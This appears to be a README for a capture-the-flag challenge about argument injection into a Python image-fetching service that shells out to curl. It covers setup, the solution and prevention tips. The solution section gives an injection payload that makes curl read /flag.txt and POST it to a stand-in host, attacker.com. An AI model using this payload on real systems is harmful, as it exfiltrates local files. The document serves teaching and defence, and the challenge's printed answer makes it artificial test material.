# Curl Short Options CTF Challenge

This is a CTF challenge that demonstrates argument injection vulnerability in a Python microservice that uses curl to fetch images.

## Setup

### Option 1: Local Setup

1. Install dependencies:
```bash
pip install -r requirements.txt
```

2. Create required directories:
```bash
mkdir -p static/uploads
```

3. Run the application:
```bash
python app.py
```

### Option 2: Docker Setup

1. Build and run using Docker Compose:
```bash
docker-compose up --build
```

2. Or build and run using Docker directly:
```bash
docker build -t curl-ctf .
docker run -p 5000:5000 curl-ctf
```

The application will be available at `http://localhost:5000`

## Challenge Description

The application allows users to upload images by providing a URL. The backend uses curl to fetch the image and performs basic validation to ensure it's a valid image file.

Your goal is to exploit the argument injection vulnerability to exfiltrate the flag from `/flag.txt` using curl's short options.

## Solution

The vulnerability lies in how the image URL is passed to curl. The application sanitizes certain characters but doesn't properly handle curl's short options.

To solve the challenge, you can use curl's `-d` option with the `@` symbol to read and send the flag file:

```
http://attacker.com -d@/flag.txt
```

This will:
1. Make a request to attacker.com
2. Use the `-d` option to send data
3. The `@` symbol tells curl to read the file `/flag.txt` and send its contents

The flag will be sent as POST data to your attacker server.

## Prevention

To prevent this vulnerability:
1. Use proper argument parsing instead of string concatenation
2. Use `subprocess.run()` with a list of arguments instead of shell=True
3. Implement proper input validation and sanitization
4. Use a whitelist approach for allowed characters 